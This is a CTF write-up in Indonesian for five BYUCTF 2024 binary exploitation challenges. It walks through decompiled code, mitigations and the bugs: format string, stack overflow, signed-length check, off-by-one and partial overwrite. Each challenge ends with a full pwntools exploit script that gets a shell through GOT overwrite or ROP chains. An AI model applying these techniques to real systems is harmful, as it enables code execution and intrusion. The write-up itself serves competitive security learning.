---
title: BYUCTF 2024 Pwn Writeup (Bahasa Indonesia)
date: '2024-05-19'
draft: false
authors: ['itoid']
tags: ['Pwn', 'byu-ctf-2024']
summary: BYUCTF 2024 Pwn Writeup (Bahasa Indonesia)
---

# BYUCTF 2024 Pwn Writeup (Bahasa Indonesia)

Solved by: itoid & msfir

## All
![chall-sc](https://github.com/jonscafe/jonscafe.github.io/assets/118645827/888f58da-3c3e-4afe-82d8-cf84f41db1db)

Diberikan sebuah zip yang berisi Executable and Linkable Format (ELF) 64-bit beserta Docker Setup untuk mendeploy challengenya di server. Langsung saja kita decompile ELFnya.
### main
```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  vuln(argc, argv, envp);
  return 0;
}
```
### vuln
```c
int vuln()
{
  int result; // eax
  char buf[32]; // [rsp+0h] [rbp-20h] BYREF

  while ( 1 )
  {
    result = strcmp(buf, "quit");
    if ( !result )
      break;
    read(0, buf, 0x100uLL);
    printf(buf);
  }
  return result;
}
```
Mari kita cek mitigasi yang ada di program tersebut dengan command `checksec`.
```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX unknown - GNU_STACK missing
    PIE:      No PIE (0x3fe000)
    Stack:    Executable
    RWX:      Has RWX segments
```
Challenge dari program ini sangat sederhana, dikarenakan stacknya `executable`, jadi cukup leak `stack address` dan masukan shellcode `execve("/bin/sh", 0, 0)` di stack untuk mendapatkan `Arbitrary Code Execution`. Selain menggunakan cara tersebut, kita juga bisa mengoverwrite `Global Offset Table (GOT)` dari fungsi `printf` karena mitigasi programnya hanya menggunakan `Partial Relocation Read-Only (RELRO)`, yang membuat GOT tetap writable. Langsung saja overwrite GOT entry dari fungsi `printf` dengan address `system` kemudian kirim `/bin/sh\0` sebagai byte string. Dengan demikian, ketika fungsi `printf` dipanggil, `system('/bin/sh')` akan dieksekusi, yang mengakibatkan terjadinya `Arbitrary Code Execution`.

Kita bisa memanfaatkan `Format String` vulnerability di fungsi `printf(buf)` untuk leak address dari `__libc_start_call_main+128` kemudian menghitung jarak relatif antara base address dari libc dengan address tersebut untuk mendapatkan base address libc.

#### POC
```python
#!/usr/bin/python3
from pwn import *
exe = './all'
elf = context.binary = ELF(exe, checksec = 0)
context.log_level = 'debug'
host, port = "nc all.chal.cyberjousting.com 1348".split(" ")[1:3]
io = remote(host, port)
sl = lambda a: io.sendline(a)
int16 = lambda a: int(a, 16)
rud = lambda a:io.recvuntil(a, drop=0x1)
com = lambda: io.interactive()

sl(b'%15$p')
libc_base = int16(rud(b'\n')) - 0x29d90
p = fmtstr_payload(0x6, {0x404008: (libc_base + 0x50d60 + 0x10)}, write_size='short')
sl(p)
sl(b'/bin/sh\0')
com()
```
![chall-sc](https://hackmd.io/_uploads/ryAKZeDQ0.png)

## Static
![chall-sc](https://github.com/jonscafe/jonscafe.github.io/assets/118645827/a5ae6990-14d1-47d9-b92e-9240a2785e63)

Diberikan sebuah Executable and Linkable Format (ELF) 64-bit. Langsung saja kita decompile ELFnya.
### main
```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  vuln(argc, argv, envp);
  return 0;
}
```
### vuln
```c
__int64 vuln()
{
  char v1[10]; // [rsp+6h] [rbp-Ah] BYREF

  return read(0LL, v1, 256LL);
}
```
Mari kita cek mitigasi yang ada di program tersebut dengan command `checksec`.
```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```
Challenge dari program ini sangat sederhana, terdapat `Buffer Overflow` vulnerability di fungsi `read(0LL, v1, 256LL)` jadi cukup buat Return-Oriented Programming (ROP) Chain `execve("/bin/sh", 0, 0)` dengan syarat`Accumulator Register ($RAX) = 59` dan memanfaatkan instruksi-instruksi assembly yang ada di program tersebut untuk mendapatkan `Arbitrary Code Execution`.

#### POC
```python
#!/usr/bin/python3
from pwn import *
exe = './static'
elf = context.binary = ELF(exe, checksec = 0)
context.log_level = 'debug'
host, port = "nc static.chal.cyberjousting.com 1350".split(" ")[1:3]
io = remote(host, port)
s = lambda a: io.send(a)
com = lambda: io.interactive()

poprdi = 0x0000000000401fe0
poprsi = 0x00000000004062d8
bss = 0x49d150
poprdx_rbp = 0x45e467
poprax = 0x000000000041069c
syscall = 0x401194
movrdxtorsipointer = 0x460c42
p = flat(cyclic(0x12), poprsi, bss, poprdx_rbp, b'/bin/sh\x00', 0, movrdxtorsipointer, poprax, 59, poprdi, bss, poprsi, 0, poprdx_rbp, 0, 0, syscall)
s(p)
com()
```
![chall-sc](https://hackmd.io/_uploads/HJWKBewX0.png)

## Numbersss
![chall-sc](https://github.com/jonscafe/jonscafe.github.io/assets/118645827/98f9c557-fd93-413b-b5d1-97f90855adc6)

Diberikan sebuah Executable and Linkable Format (ELF) 64-bit dan Dockerfile. Langsung saja kita decompile ELFnya.
### main
```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  vuln(argc, argv, envp);
  return 0;
}
```
### vuln
```c
__int64 vuln()
{
  __int64 result; // rax
  char v1[16]; // [rsp+0h] [rbp-10h] BYREF

  printf("Free junk: %p\n", &printf);
  puts("How many bytes do you want to read in?");
  __isoc99_scanf("%hhd", &length);
  if ( length > 16 )
  {
    puts("Too many bytes!");
    exit(1);
  }
  for ( counter = 0; ; ++counter )
  {
    result = (unsigned __int8)length;
    if ( counter == length )
      break;
    read(0, &v1[counter], 1uLL);
  }
  return result;
}
```
Mari kita cek mitigasi yang ada di program tersebut dengan command `checksec`.
```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x3fe000)
```
Challenge dari program ini sangat sederhana. Program melakukan pengecekan terhadap panjang variabel `&length`, jika panjangnya lebih dari 16 maka program akan exit. Terdapat `Out-of-Bounds (OOB)` vulnerability di fungsi `__isoc99_scanf("%hhd", &length);`. Karena tipe data variabel `&length` adalah `signed char` yang mempunyai range dari `-128 sampai dengan 127`, kita bisa memasukan angka `128` sehingga yang tersimpan pada memori adalah `-128`. Program akan membaca inputan kita dengan `read(0, &v1[counter], 1uLL); (byte by byte)`, jadi cukup melakukan Return-Oriented Programming (ROP) Chain `system('/bin/sh')` dengan tambahan instruksi assembly `ret` karena terdapat `Move Aligned Packed Single-Precision Floating-Point Values (MOVAPS)` di 64-bit ELF, kemudian payloadnya bisa difill dengan sembarang karakter sampai panjang payloadnya 128 untuk mendapatkan `Arbitrary Code Execution`.

#### POC
```python
#!/usr/bin/python3
from pwn import *
exe = './numbersss'
elf = context.binary = ELF(exe, checksec = 0)
context.log_level = 'debug'
host, port = "nc numbersss.chal.cyberjousting.com 1351".split(" ")[1:3]
io = remote(host, port)
sl = lambda a: io.sendline(a)
sla = lambda a, b: io.sendlineafter(a, b)
int16 = lambda a: int(a, 16)
rud = lambda a:io.recvuntil(a, drop=0x1)
lj = lambda a, b, c : a.ljust(b, c)
com = lambda: io.interactive()
libc = ELF("./libc.so.6", checksec = 0)
ld = ELF("./ld-linux.so", checksec = 0)

rud(b'Free junk: ')
leaked_printf = int16(rud(b'\n'))
libc.address = leaked_printf - libc.sym['printf']
sla(b'in?\n', b'128')
rop = ROP(libc)
rop.raw(cyclic(0x18))
rop.call(rop.ret.address)
rop.system(next(libc.search(b'/bin/sh\0')))
p = lj(rop.chain(), 128, b'\0')
sl(p)
com()
```
![chall-sc](https://hackmd.io/_uploads/r1UtvewmC.png)

## Gargantuan
![chall-sc](https://github.com/jonscafe/jonscafe.github.io/assets/118645827/f8aab550-99ce-4f42-824e-86cb2f172221)

Diberikan sebuah Executable and Linkable Format (ELF) 64-bit dan libc. Langsung saja kita decompile ELFnya.
### main
```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  puts("Welcome!");
  puts("Enter your input below:");
  gargantuan("Enter your input below:");
  return 0;
}
```
### gargantuan
```c
int gargantuan()
{
  size_t v0; // rbx
  size_t v1; // rax
  char buf[512]; // [rsp+0h] [rbp-720h] BYREF
  char s[1288]; // [rsp+200h] [rbp-520h] BYREF
  int v5; // [rsp+708h] [rbp-18h]
  int i; // [rsp+70Ch] [rbp-14h]

  memset(s, 0, 0x500uLL);
  for ( i = 0; i <= 4; ++i )
  {
    v5 = read(0, buf, 0x200uLL);
    if ( v5 <= 0 )
    {
      puts("read error");
      return printf("Oh I'm sorry, did you want this?? Oops, TOO LATE! %p\n", gargantuan);
    }
    if ( strlen(buf) > 0x100 )
    {
      puts("too large");
      return printf("Oh I'm sorry, did you want this?? Oops, TOO LATE! %p\n", gargantuan);
    }
    v0 = v5;
    v1 = strlen(s);
    memcpy(&s[v1], buf, v0);
  }
  return printf("Oh I'm sorry, did you want this?? Oops, TOO LATE! %p\n", gargantuan);
}
```
Mari kita cek mitigasi yang ada di program tersebut dengan command `checksec`.
```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
    RUNPATH:  b'.'
```
PIE enabled (Position Independent Executable diaktifkan). Terdapat `Off-by-one` vulnerability di iterasi kelima fungsi `v5 = read(0, buf, 0x200uLL);`, jadi kita bisa memanfaatkan vulnerability tersebut untuk melakukan `Execution Flow Hijacking` dengan cara mengoverwrite address instruksi assembly `mov eax, 0` menjadi address fungsi `gargantuan` sehingga program tidak akan langsung exit, namun akan kembali ke fungsi `gargantuan` dan address dari fungsi `gargantuan` akan dileak. 

State stack destination sebelum `memcpy(&s[v1], buf, v0);` pada iterasi kelima.

![chall-sc](https://hackmd.io/_uploads/rk6GgZDmA.png)

State stack destination setelah `memcpy(&s[v1], buf, v0);` pada iterasi kelima.

![chall-sc](https://hackmd.io/_uploads/SkUVeWP7R.png)

Kita dapat menghitung jarak relatif base address dari ELF dengan address dari fungsi `gargantuan` untuk mendapatkan base address dari ELF tersebut. Setelah itu, kita dapat melakukan Return-Oriented Programming (ROP) Chain untuk leak address `libc.sym.puts` melalui `Procedure Linkage Table (PLT)` fungsi `puts`, dan melakukan Return-Oriented Programming (ROP) Chain kembali untuk memanggil `system('/bin/sh')` yang mengakibatkan `Arbitrary Code Execution`.


#### POC
```python
#!/usr/bin/python3
from pwn import *
exe = './gargantuan'
elf = context.binary = ELF(exe, checksec = 0)
context.log_level = 'debug'
host, port = "nc gargantuan.chal.cyberjousting.com 1352".split(" ")[1:3]
io = remote(host, port)
sla = lambda a, b: io.sendlineafter(a, b)
sa = lambda a, b: io.sendafter(a, b)
ru = lambda a: io.recvuntil(a)
s = lambda a: io.send(a)
sl = lambda a: io.sendline(a)
rl = lambda: io.recvline()
com = lambda: io.interactive()
li = lambda a: log.info(a)
rud = lambda a:io.recvuntil(a, drop=0x1)
r = lambda: io.recv()
int16 = lambda a: int(a, 16)
rar = lambda a: io.recv(a)
rj = lambda a, b, c : a.rjust(b, c)
lj = lambda a, b, c : a.ljust(b, c)
d = lambda a: a.decode('utf-8')
e = lambda a: a.encode()
cl = lambda: io.close()
rlf = lambda: io.recvline(0)

def attack(wtc):
	s(lj(b'A' * 0x100, 0x200, b'\0'))
	sleep(0.2)
	s(lj(b'A' * 0x100, 0x200, b'\0'))
	sleep(0.2)
	s(lj(b'A' * 0x100, 0x200, b'\0'))
	sleep(0.2)
	s(lj(b'A' * 0x100, 0x200, b'\0'))
	sleep(0.2)
	s(b'E' * 0x100 + p64(0) + b'F' * 32 + wtc)

attack(b'\x0b') 
rud(b'TOO LATE! ')
gargantuan = int16(rud(b'\n'))
elf.address = gargantuan - 0x000011e5
assert elf.address & 0xfff == 0
li(f"ELF Address: {hex(elf.address)}")
libc = ELF("./libc.so.6", checksec = 0)
rop = ROP(elf)
rop.puts(elf.got.puts)
rop.gargantuan()
li(f"rop chain: {rop.dump()}")
attack(rop.chain())
rl()
leaked_puts = u64(lj(rud(b'\n'), 8, b'\0'))
li(f"Leaked puts: {hex(leaked_puts)}")
libc.address = leaked_puts - libc.sym.puts
rop = ROP(libc)
rop.call(rop.ret.address)
rop.system(next(libc.search(b'/bin/sh\0')))
li(f"rop chain: {rop.dump()}")
attack(rop.chain())
com()
```
![chall-sc](https://hackmd.io/_uploads/B1LF84DmA.png)

## Directory
![chall-sc](https://github.com/jonscafe/jonscafe.github.io/assets/118645827/dce01d71-16b1-4a98-9cb4-b26d8cd4ed88)

Diberikan sebuah zip yang berisi Executable and Linkable Format (ELF) 64-bit beserta Docker Setup untuk mendeploy challengenya di server. Langsung saja kita decompile ELFnya.
### main
```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  process_menu(argc, argv, envp);
  return 0;
}
```
### process_menu
```c
__int64 process_menu()
{
  __int64 result; // rax
  int v1; // [rsp+0h] [rbp-1E0h]
  char v2[256]; // [rsp+4h] [rbp-1DCh] BYREF
  unsigned int v3; // [rsp+104h] [rbp-DCh] BYREF
  int v4[52]; // [rsp+108h] [rbp-D8h] BYREF
  unsigned int i; // [rsp+1D8h] [rbp-8h]
  int j; // [rsp+1DCh] [rbp-4h]

  v1 = 0;
  while ( 1 )
  {
    result = v3;
    if ( v3 == 4 )
      return result;
    print_menu();
    printf("> ");
    __isoc99_scanf("%d", &v3);
    if ( v3 == 4 )
    {
      puts("Exiting...");
    }
    else
    {
      if ( (int)v3 > 4 )
        goto LABEL_23;
      switch ( v3 )
      {
        case 3u:
          puts("Printing directory...");
          for ( i = 0; (int)i < v1; ++i )
            printf("%d. %s\n", i, &v2[20 * i + 264]);
          break;
        case 1u:
          if ( v1 <= 9 )
          {
            puts("Enter name: ");
            v4[0] = read(0, v2, 0x30uLL);
            v2[strcspn(v2, "\n")] = 0;
            memcpy(&v2[20 * v1++ + 264], v2, v4[0]);
          }
          else
          {
            puts("Directory is full!");
          }
          break;
        case 2u:
          puts("Enter index: ");
          __isoc99_scanf("%d", v4);
          if ( v4[0] >= 0 && v4[0] < v1 )
          {
            for ( j = v4[0]; j < v1; ++j )
              strcpy(&v2[20 * j + 264], &v2[20 * j + 284]);
            --v1;
          }
          else
          {
            puts("Invalid index!");
          }
          break;
        default:
LABEL_23:
          puts("Invalid option");
          break;
      }
    }
  }
}
```
### print_menu
```c
int print_menu()
{
  puts("1. Add a name");
  puts("2. Remove a name");
  puts("3. Print directory");
  return puts("4. Exit");
}
```
### win
```c
int win()
{
  return system("/bin/sh");
}
```
Mari kita cek mitigasi yang ada di program tersebut dengan command `checksec`.
```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
```
Challenge dari program ini sangat sederhana, cukup overwrite address instruksi assembly `mov eax, 0` dengan address instruksi assembly `lea rax, str._bin_sh` yang terdapat pada fungsi `win` dengan `one-byte overwrite` pada iterasi kesepuluh fungsi `v4[0] = read(0, v2, 0x30uLL);` untuk mendapatkan `Arbitrary Code Execution`.

State stack destination sebelum `memcpy(&v2[20 * v1++ + 264], v2, v4[0]);` pada iterasi kesepuluh.

![image](https://hackmd.io/_uploads/HkIAUWPXR.png)

State stack destination setelah `memcpy(&v2[20 * v1++ + 264], v2, v4[0]);` pada iterasi kesepuluh.

![image](https://hackmd.io/_uploads/S151vbw70.png)


#### POC
```python
#!/usr/bin/python3
from pwn import *
exe = './directory'
elf = context.binary = ELF(exe, checksec = 0)
context.log_level = 'debug'
host, port = "nc directory.chal.cyberjousting.com 1349".split(" ")[1:3]
io = remote(host, port)
sla = lambda a, b: io.sendlineafter(a, b)
sa = lambda a, b: io.sendafter(a, b)
sl = lambda a: io.sendline(a)
com = lambda: io.interactive()
li = lambda a: log.info(a)

for i in range(1, 10, 1):
	sla(b'> ', b'1')
	p = b'A' * 0x30
	li(f"iterasi ke - {i}")
	sa(b'name: \n', p)
sla(b'> ', b'1')
p = flat({0x28: p8(0x3b)})
sa(b'name: \n', p)
sla(b'> ', b'4')
com()
```
![chall-sc](https://github.com/jonscafe/jonscafe.github.io/assets/118645827/b80e886c-b208-4403-91f8-9e9275e93619)
